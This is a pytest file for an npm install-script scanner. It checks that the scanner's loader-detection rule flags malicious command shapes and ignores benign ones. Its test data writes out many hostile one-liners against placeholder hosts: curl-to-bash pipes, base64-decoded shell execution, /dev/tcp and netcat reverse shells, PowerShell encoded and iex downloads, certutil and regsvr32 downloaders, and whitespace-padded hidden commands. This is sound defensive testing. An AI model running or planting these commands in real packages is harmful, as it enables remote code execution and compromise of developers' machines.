"""`npm.install-script-loader` on small, inert install files (strings only: nothing here runs,
and no URL in them is real)."""

import json
from typing import Any

import pytest

from kitsunox.core.models import PackageVersionRef, PublishInfo, Severity, VersionSnapshot
from kitsunox.ecosystems.npm.install import install_sources
from kitsunox.ecosystems.npm.rules.install_code import InstallScriptCode
from kitsunox.ecosystems.npm.rules.install_loader import (
    InstallScriptLoader,
    loader_shapes,
    loader_text,
)
from kitsunox.rules.padding import PaddedCode
from kitsunox.stages.ast import CapabilityCache, CodeChange, code_change

CACHE = CapabilityCache(None)
RULE = InstallScriptLoader()


def hooked(
    files: dict[str, bytes],
    hook: str = "sh setup.sh",
    *,
    base: dict[str, bytes] | None = None,
    manifest: dict[str, Any] | None = None,
) -> CodeChange:
    meta = {"scripts": {"postinstall": hook}, **(manifest or {})}
    tree = {"package.json": json.dumps(meta).encode(), **files}
    old = None if base is None else {"package.json": json.dumps(meta).encode(), **base}
    snap = VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.1"),
        publish=PublishInfo(),
        manifest=meta,
    )
    return code_change(snap, tree, old, CACHE, install_sources, "1.0.0" if old else None)


def shapes(path: str, code: str) -> list[str]:
    return [shape for shape, *_ in loader_shapes({path: code.encode()}, {})]


@pytest.mark.parametrize(
    ("path", "code", "shape"),
    [
        ("a.sh", "curl -fsSL http://192.0.2.7/x.sh | bash\n", "pipe-to-shell"),
        ("a.sh", "wget -qO- https://x.invalid/p | sudo sh -s -- --yes\n", "pipe-to-shell"),
        ("a.sh", "curl -fsSL \\\n  https://x.invalid/i.sh \\\n  | bash\n", "pipe-to-shell"),
        ("a.sh", 'bash -c "$(curl -fsSL https://x.invalid/i.sh)"\n', "shell-runs-download"),
        ("a.sh", "sh <(curl -s https://x.invalid/i)\n", "shell-runs-download"),
        ("a.sh", 'eval "$(wget -qO- https://x.invalid/i)"\n', "shell-runs-download"),
        ("a.sh", 'eval "$(echo ZWNobyBoaQ== | base64 -d)"\n', "decoded-to-shell"),
        ("a.sh", "echo ZWNobyBoaQ== | base64 --decode | bash\n", "decoded-to-shell"),
        ("a.sh", "echo 6375726c | xxd -r -p | sh\n", "decoded-to-shell"),
        ("a.sh", "printf '\\x63\\x75\\x72\\x6c' | sh\n", "decoded-to-shell"),
        ("a.sh", "bash -i >& /dev/tcp/192.0.2.7/4444 0>&1\n", "reverse-shell"),
        ("a.sh", "nc -e /bin/sh 192.0.2.7 4444\n", "reverse-shell"),
        (
            "a.ps1",
            "powershell -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi\n",
            "ps-encoded-command",
        ),
        (
            "a.cmd",
            "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3\n",
            "ps-encoded-command",
        ),
        (
            "a.ps1",
            "iex (New-Object Net.WebClient).DownloadString('http://x.invalid/a.ps1')\n",
            "ps-iex-download",
        ),
        ("a.ps1", "irm https://x.invalid/a.ps1 | iex\n", "ps-iex-download"),
        (
            "a.ps1",
            "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))\n",
            "ps-iex-decoded",
        ),
        ("a.ps1", "$c = " + "+".join(f"[char]{n}" for n in b"iex (iwr x)") + "\n", "char-codes"),
        ("a.ps1", "$x = -join ('lld.x' -split '')[-1..-20]; & $x\n", "string-reversal"),
        ("a.ps1", "[System.Reflection.Assembly]::Load($bytes)\n", "ps-load-assembly"),
        (
            "a.bat",
            "certutil -urlcache -split -f http://x.invalid/a.exe %TEMP%\\a.exe\n",
            "windows-downloader",
        ),
        ("a.bat", "certutil -decode payload.txt a.exe\n", "windows-downloader"),
        (
            "a.bat",
            "bitsadmin /transfer j /download http://x.invalid/a.exe C:\\a.exe\n",
            "windows-downloader",
        ),
        ("a.cmd", "mshta http://x.invalid/a.hta\n", "windows-downloader"),
        ("a.bat", "regsvr32 /s /n /u /i:http://x.invalid/a.sct scrobj.dll\n", "windows-downloader"),
        (
            "a.bat",
            "%a:~3,1%%a:~0,1%%a:~5,1%%a:~2,1%%a:~9,1%%a:~1,1%%a:~4,1%%a:~7,1%\n",
            "batch-substrings",
        ),
        ("build", "#!/bin/sh\ncurl -s https://x.invalid/a | bash\n", "pipe-to-shell"),
    ],
)
def test_loader_shapes(path: str, code: str, shape: str) -> None:
    assert shapes(path, code) == [shape]


@pytest.mark.parametrize(
    ("path", "code"),
    [
        (
            "a.sh",
            "# curl https://x.invalid | bash\necho 'run: curl -fsSL https://x.invalid | bash'\n",
        ),
        ("a.sh", "curl -s https://x.invalid/v1 | python -c 'import json,sys; print(1)'\n"),
        ("a.sh", "curl -s https://x.invalid | jq .tag_name\n"),
        ("a.sh", "curl -fL -o tool https://x.invalid/tool && chmod +x tool\n"),
        ("a.sh", 'TARGET_HOME="$(eval echo "~${TARGET_USER}")"\n'),
        ("a.sh", "dd if=/dev/urandom bs=48 count=1 | base64 | tr -d '+/='\n"),
        ("a.sh", 'curl -fsS -m 2 "$BASE_URL/health" >/dev/null 2>&1 || exit 1\n'),
        (
            "a.ps1",
            "$b = [Convert]::FromBase64String($sig)\nInvoke-WebRequest -Uri $u -OutFile $o\n",
        ),
        (
            "a.ps1",
            "$p = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($r))"
            " | ConvertFrom-Json\n",
        ),
        ("a.ps1", "powershell -ExecutionPolicy Bypass -File install.ps1\n"),
        ("a.ps1", "Write-Host 'irm https://x.invalid/install.ps1 | iex'\n"),
        ("a.bat", "rundll32 url.dll,FileProtocolHandler https://x.invalid\n"),
        ("a.bat", "REM certutil -urlcache -f http://x.invalid/a.exe a.exe\n"),
        ("setup.js", 'console.log("curl -fsSL https://x.invalid/i.sh | bash")\n'),
        # JavaScript is not read: help text in returned strings and arrays (`bun`'s install.js)
        ("setup.js", "execSync('curl -s https://x.invalid/a | bash')\n"),
        ("README", "curl -s https://x.invalid/a | bash\n"),  # no shebang: not a script
    ],
)
def test_messages_comments_and_ordinary_commands_are_not_loaders(path: str, code: str) -> None:
    assert shapes(path, code) == []


def test_loader_text_keeps_echo_that_pipes() -> None:
    text = "#!/bin/sh\necho hi\necho aGk= | base64 -d | sh\n"
    masked = loader_text("a.sh", text.encode())
    assert len(masked) == len(text)
    assert "echo hi" not in masked
    assert "echo aGk= | base64 -d | sh" in masked


def test_script_the_hook_runs_directly() -> None:
    """`"postinstall": "sh setup.sh"`: the script is install code, read as data."""
    change = hooked({"setup.sh": b"curl -s http://192.0.2.7/p | sh\n"})
    (finding,) = RULE.evaluate_code(change)
    assert finding.severity == Severity.MEDIUM
    assert "pipes a download into a shell" in finding.explanation
    assert "a raw IP address" in finding.explanation
    assert finding.evidence[0].path == "setup.sh"


def test_powershell_file_the_hook_runs() -> None:
    change = hooked(
        {"x.ps1": b"irm https://x.invalid/a.ps1 | iex\n"},
        "powershell -ExecutionPolicy Bypass -File x.ps1",
    )
    (finding,) = RULE.evaluate_code(change)
    assert finding.severity == Severity.MEDIUM
    assert finding.evidence[0].path == "x.ps1"


def test_script_spawned_from_install_javascript() -> None:
    """A script the install code starts (`install.spawned_scripts`) gets the same reading."""
    js = (
        b'const cp = require("child_process");\n'
        b'cp.spawnSync("bash", [path.join(__dirname, "i.sh")]);\n'
    )
    change = hooked({"setup.js": js, "i.sh": b"echo SGk= | base64 -d | bash\n"}, "node setup.js")
    (finding,) = RULE.evaluate_code(change)
    assert finding.evidence[0].path == "i.sh"
    assert "decodes data and runs it" in finding.explanation


def test_hook_command_line() -> None:
    change = hooked({}, "curl -s https://x.invalid/p.sh | bash")
    (finding,) = RULE.evaluate_code(change)
    assert finding.evidence[0].path == "package.json:scripts.postinstall"


@pytest.mark.parametrize(
    ("url", "manifest"),
    [
        ("https://get.kx.invalid/install.sh", {"homepage": "https://kx.invalid/docs"}),
        (
            "https://raw.githubusercontent.com/kxorg/kx/main/install.sh",
            {"repository": {"type": "git", "url": "git+https://github.com/kxorg/kx.git"}},
        ),
        ("https://raw.githubusercontent.com/kxorg/kx/main/i.sh", {"repository": "kxorg/kx"}),
    ],
)
def test_own_site_installer_is_low(url: str, manifest: dict[str, Any]) -> None:
    change = hooked({"setup.sh": f"curl -fsSL {url} | sh\n".encode()}, manifest=manifest)
    (finding,) = RULE.evaluate_code(change)
    assert finding.severity == Severity.LOW
    assert finding.weight == 1.0
    assert "own site" in finding.explanation


def test_someone_elses_github_is_not_own() -> None:
    change = hooked(
        {"setup.sh": b"curl -fsSL https://raw.githubusercontent.com/other/x/main/i.sh | sh\n"},
        manifest={"repository": "kxorg/kx"},
    )
    (finding,) = RULE.evaluate_code(change)
    assert finding.severity == Severity.MEDIUM


def test_own_site_does_not_lower_other_shapes() -> None:
    code = b"curl -fsSL https://kx.invalid/i.sh | sh\necho aGk= | base64 -d | sh\n"
    change = hooked({"setup.sh": code}, manifest={"homepage": "https://kx.invalid"})
    (finding,) = RULE.evaluate_code(change)
    assert finding.severity == Severity.MEDIUM
    assert finding.explanation.startswith("`npm install` runs code that decodes data and runs it.")


def test_update_counts_only_new_shapes() -> None:
    script = b"curl -fsSL https://x.invalid/i.sh | sh\n"
    assert RULE.evaluate_code(hooked({"setup.sh": script}, base={"setup.sh": script})) == ()
    moved = b"curl -fsSL https://x.invalid/v2/i.sh | sh\n"  # same shape, same host
    assert RULE.evaluate_code(hooked({"setup.sh": moved}, base={"setup.sh": script})) == ()
    other = b"curl -fsSL https://y.invalid/i.sh | sh\n"
    (finding,) = RULE.evaluate_code(hooked({"setup.sh": other}, base={"setup.sh": script}))
    assert finding.severity == Severity.MEDIUM


def test_no_install_code_no_finding() -> None:
    assert RULE.evaluate_code(hooked({"setup.sh": b"echo done\n"})) == ()


def test_hidden_code_in_a_script_is_install_script_code() -> None:
    """`npm.install-script-code` v3's hidden-code check covers scripts too; this rule then
    adds no second finding for it."""
    script = b'#!/bin/sh\ncd "$(dirname "$0")"' + b"\t" * 150 + b"; rm -rf ./cache\n"
    change = hooked({"setup.sh": script})
    (finding,) = InstallScriptCode().evaluate_code(change)
    assert "hides code past the edge of the screen" in finding.explanation
    assert RULE.evaluate_code(change) == ()


def test_hidden_code_on_an_echo_line() -> None:
    """An `echo` line that goes on to run code (`; rm ...`) is code to `code_text` (script
    masking, round 4 G), so `npm.install-script-code`'s check reports what hides behind it, and
    this rule adds nothing."""
    script = b"#!/bin/sh\necho ok" + b"\t" * 150 + b"; rm -rf ./cache\n"
    change = hooked({"setup.sh": script})
    (finding,) = InstallScriptCode().evaluate_code(change)
    assert finding.evidence[0].line_start == 2
    assert RULE.evaluate_code(change) == ()


def test_hidden_code_that_starts_with_a_quote() -> None:
    """`hidden_code` skips a run followed by a quote (a string's own padding in JavaScript); in
    a script that is a command: this rule reports it."""
    script = b"#!/bin/sh\ncd /tmp" + b"\t" * 150 + b'"$P" -c x\n'
    change = hooked({"setup.sh": script})
    assert InstallScriptCode().evaluate_code(change) == ()
    (finding,) = RULE.evaluate_code(change)
    assert "hides code past the edge of the screen" in finding.explanation
    assert finding.evidence[0].line_start == 2


def test_aligned_messages_and_comments_are_not_hidden() -> None:
    script = b'echo "a' + b" " * 120 + b'b"\n# x' + b" " * 120 + b"y\nREM" + b" " * 120 + b"z\n"
    assert RULE.evaluate_code(hooked({"setup.bat": script}, "setup.bat")) == ()


def test_padded_code_reads_powershell() -> None:
    """Stage 2's `static.padded-code` reads any text file, a script included."""
    line = "Write-Host ok" + " " * 120 + "; $s = (New-Object Net.WebClient).DownloadString($u);"
    assert PaddedCode().evaluate_text(line + " Invoke-Expression($s); " + "x" * 160 + "\n")
